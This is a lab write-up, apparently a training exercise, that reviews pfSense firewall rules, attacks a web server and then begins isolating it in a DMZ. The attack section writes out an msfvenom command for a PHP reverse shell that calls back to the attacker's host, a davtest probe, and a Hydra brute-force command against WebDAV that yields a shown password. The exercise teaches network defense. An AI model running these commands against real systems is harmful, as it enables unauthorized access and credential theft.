To  connect to the pfSense firewall, I just type in its IP into the browser: http://10.1.0.254
- 10.1.0.254 is this network's default gateway. Usually, the default gateway is a router, in this case, pfSense works as both a router and a firewall, and that is why it's this network's default gateway.

- This firewall/router is configured with one external and one internal interface. The firewall screens the local network segment from external networks, allowing only traffic matching the access control list (ACL) through.

<h3>Reviewing Firewall ACLs</h3>

I can access the ACL or rules by clicking **Firewall > Rules**
- Here I can see that there are multiple tabs, so there can be separate rules for the the WAN and LAN

![image](https://github.com/user-attachments/assets/95711b78-a316-407f-827f-e24c73f9ca42)
- Several types of traffic are permitted into the LAN: ICMP (ping), DNS, HTTP/HTTPS, and SMTP.
- All except the ICMP rule, are forwarding rules meaning that traffic for those ports is directed to a host on the LAN.

Now on the **LAN tab**
![image](https://github.com/user-attachments/assets/4bc00873-6876-4173-a484-fb810bc2e080)
- Based on these rules, there is no egress filtering. Any type of traffic from a host on the LAN is permitted to any endpoint, **unless** a deny rule is placed higher in the ACL.
  - The order of the rules can be changed around since  the firewall prioritizes the rules from top to bottom, it will change how the firewall behaves with certain traffic.
- The **Anti-Lockout Rule** prevents the firewall from locking out an administrator from the web interface.
It's enabled by default and allows traffic from any source within the network to any firewall administration protocol listening on the LAN IP address.

If I now click on **Firewall > NAT**, it shows the hosts that are designated to receive traffic for DNS, HTTP/HTTPS, and SMTP.

- These rules however create a vulnerability,

<h3>Testing Host Security</h3>

In order to demonstrate how a server may make other hosts on the same segment vulnerable, I will run an attack against the web server.

On a Kali VM, which I'll be using as the attack box (AB), I'll start msfconsole and run the following commands: 

1: msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.2.192 lport=8080 -f raw > /root/get.php
- Creates a reverse shell via PHP code
![image](https://github.com/user-attachments/assets/844f1c13-d830-4f2e-aa5c-0df1d04a3e03)

2: davtest -url http://www.515support.com/webdav
- I'll leverage the serverâ€™s webdav environment to upload malicious code
![image](https://github.com/user-attachments/assets/4e550bbe-86db-4537-b21d-61571f1a6d22)

This environment is password-protected so it failed to connect, however, I'll use the password cracker THC Hydra or Hydra and a wordlist containing possible usernames and password variations, and perform a credential-stuffing attack. 

Command: hydra -L /root/Downloads/users-515support.txt -P /root/Downloads/pwd-515support.txt www.515support.com http-get /webdav

![image](https://github.com/user-attachments/assets/9c1676b0-ecc5-4e98-906d-65d3f4719636)
- Hydra was able to crack the user/password combo of dev:Pa$$w0rd

Now I can try connecting again using these credentials
![image](https://github.com/user-attachments/assets/bc809845-89f7-4d4f-aa30-1463449c51fe)

Now that I'm connected I can start the listener

![image](https://github.com/user-attachments/assets/650491ad-54a3-4c62-82df-f7b303848371)

On a second terminal window, I'll run the following command to trigger the script and start the reverse shell
![image](https://github.com/user-attachments/assets/cb510199-1bdb-4420-a7b0-c091133b3d16)

Back on the terminal running msfconsole, the meterpreter shell was successful, and I now  have access to the server's command line.

Leaving the session in the background to try creating a hash dump, results in failure because I dont have root access.

Trying a different method also yields no access, however, there is the potential for intrusion against other hosts on the network.

The reason there it's possible to gain access to another host on the network is because of the firewall rules. If firewall rules were filtering connections between this server and other hosts, 
and blocking unauthorized outbound connections, then this would not be possible.

<h3>Configuring Segmentation</h3>

Now I will configure the firewall so that the web server is isolated in a demilitarized zone (DMZ) segment, separate from other hosts.

In Hyper-V Manager, Virtual Switch Manager > Private > Create Virtual Switch and name the switch 'vDMZ'
![image](https://github.com/user-attachments/assets/a1add197-8bb8-4f8e-ad3c-23bcfca3e541)

Now in the settings menu for UTM1, I'll set the vDMZ switch for the hn2 adapter

![image](https://github.com/user-attachments/assets/42798972-644d-4d35-88bd-a82e55b927a2)
![image](https://github.com/user-attachments/assets/58165c35-a154-4592-b473-bd97cb7a873b)

And I'll do the same for LX1, on the eth0 adapter

![image](https://github.com/user-attachments/assets/9c084d65-9284-4079-93d0-a980177c841c)

Back on pfSense, Clicking on **Interfaces > Assignments**
![image](https://github.com/user-attachments/assets/edda3a98-8f04-4080-8122-a25dbbb2bcfd)
And I added OPT1, which is UTM1's interface connected to the virtual switch (vDMZ)
![image](https://github.com/user-attachments/assets/b95b2700-816d-4e64-b19c-9de6bdeab33d)

Clicking on **Interfaces > OPT1**, I enabled the interface and set the IPv4 address as 10.1.254.254 /24 and to be static, then saved the configuration at the bottom of the menu

![image](https://github.com/user-attachments/assets/83159cc6-a7b6-4dae-bc46-dd2506a4015c)

Clicking on **Firewall > NAT**, I'm going to edit the HTTP forwarding rule
